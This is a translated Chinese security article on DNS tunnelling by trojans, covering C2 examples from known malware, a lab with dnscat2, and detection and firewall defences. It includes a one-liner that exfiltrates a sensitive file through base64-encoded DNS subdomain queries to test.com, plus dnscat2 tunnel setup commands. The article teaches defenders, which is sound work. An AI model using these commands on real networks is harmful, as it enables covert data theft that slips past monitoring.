# 隧道技术之DNS和ICMP及其检测与防御

## 译文声明
本文为翻译文章，具体表达及含义以原文为准。

## 简述
为了逃避监测、绕过杀毒软件并更好地隐藏自身，许多木马使用了隧道技术。那么，什么是隧道技术？它有哪些特点？当前的现状如何？

### 隧道技术（Tunneling）
隧道技术是一种通过互联网基础设施在网络之间传递数据的方法。它将不同协议的数据帧或包重新封装，并通过新的帧头提供路由信息，以便通过互联网传输被封装的数据。

### 数据传输特点
隧道技术不直接在网络中发送数据包，而是通过封装技术在另一个（通常是加密的）连接中发送数据。

### 当前状况
传统的socket隧道已很少见，而TCP和UDP大量被防御系统拦截。相比之下，DNS、ICMP和HTTP/HTTPS等难以禁止的协议已成为黑客控制隧道的主要选择。

### DNS隧道的强大之处
一方面，DNS报文天然具有穿透防火墙的能力；另一方面，目前的安全策略如杀毒软件和入侵检测系统对DNS报文的监控管理较为薄弱。接下来，我们将回顾几个典型的攻击事件中的隧道木马特点。

#### ALMA Communicator From OilRig黑客组织
- **特点**：使用DNS隧道作为C2通信信道，通过特定子域名向C2服务器传输数据，服务器使用专用IPv4地址向木马发送数据。
- **C2域名结构**：
  - DNS查询时的结构

#### Trojan.Win32.Ismdoor.gen
- **特点**：使用DNS隧道，限制传出数据报长度为60字符，命令解析到IPv6地址。
- **典型查询示例**：`n.n.c...com`
- **传输层请求和响应的结构**

#### XshellGhost
- **特点**：在发送数据包时，将数据嵌套到DNS协议中，并编码成特定字符串添加到配置文件中的CCDNS URL前。
- **Xshell DNS隧道通讯编码**
- **Xshell DNS隧道通讯源码**

### 检测与防御
这些DNS隧道木马的共性在于它们的DNS通信协议看起来异常。检测方法主要分为两类：载荷分析和流量监测。

- **载荷分析**：识别主机名超过52个字符的DNS请求，正常的域名遵循Zipf定律，而DNS隧道的域名则呈现随机分布。
- **流量监测**：通过检测单位时间内DNS报文流速率来发现DNS隧道，特别是TXT类型的DNS报文。

## 实验环境
接下来，我将使用GitHub上的开源隧道工具如dnscat2、Reverse_DNS_Shell、icmpsh和icmptunnel进行实验，分析其通信并提取相关特征。

- **Server**: `inet 192.168.30.129 Debian 7.2`
- **Client**: `inet 192.168.30.130 Debian 7.2`
- **Other**: `inet 192.168.30.134 Win XP`

### DNS隧道
DNS隧道通信是C&C常用的通信方式，常用编码方式包括Base64、Binary和Hex编码。请求类型通常为TXT，Payload部分一般为子域名。

#### 应用场景
在安全策略严格的内网环境中，常见的C&C端口被众多安全设备监控。如果红队渗透目标内网终端时发现只允许白名单流量出站且其他端口被屏蔽，传统C&C手段无法成立，此时可以使用DNS隐蔽隧道建立反向Shell。

#### 示例
```bash
for I in $(cat sensitive.txt); do d=$(echo $I | base64) && nslookup $d.test.com; done
```
- **说明**：对每行内容进行Base64编码，在DNS查询期间将其用作子域。一旦查询到达test.com的权威DNS服务器，可以通过解析日志获取子域，从而获得敏感数据。

#### 缺点
1. 单向通信，不能从C2服务器发回命令。
2. 读取大文件时，DNS数据包可能以不同的顺序到达。

### 具体工具介绍

#### DnsCat2
- **特点**：支持加密，通过预共享密钥进行身份验证，支持多种DNS查询类型（TXT, MX, CNAME, A, AAAA）。客户端用C语言编写，服务器用Ruby编写。
- **部署**：
  - **Client**:
    ```bash
    $ git clone https://github.com/iagox86/dnscat2.git
    $ cd dnscat2/client/
    $ make
    ```
  - **Server**:
    ```bash
    yum install rubygems
    gem install bundler
    git clone https://github.com/iagox86/dnscat2.git
    cd dnscat2/server
    bundle install
    ```
- **参数介绍**：
  - `-c` 参数定义预共享密钥，防止中间人攻击。
  - `-e` 参数规定安全级别，`open` 代表让客户端选择。
  - `--no-cache` 在运行服务器时添加无缓存选项。
- **使用示例**：
  - **Server**:
    ```bash
    ruby ./dnscat2.rb
    ```
  - **Client**:
    ```bash
    ./dnscat --dns server=192.168.30.129,port=53 --secret=a152c1cc946358825617f5cbcd3dce44
    ```

#### 检测与防御
- **检测**：
  1. 默认的dnscat查询中包含“dnscat”字符串，可作为防火墙和入侵检测的特征。
  2. 检查出站DNS查询的长度、频率和类型。
  3. 记录DNS查询日志，通过频率、长度和类型监控异常日志。
- **防御**：防火墙上限制只允许与受信任的DNS服务器通信。

#### Dnscat2-Powershell
- **特点**：可通过通用签名避免检测，支持延迟和最大请求大小设置，使用A和AAAA查询类型以减少IDS告警。

#### Reverse_DNS_Shell
- **特点**：使用DNS作为C2通道的Python反向Shell。

希望以上内容对你有所帮助！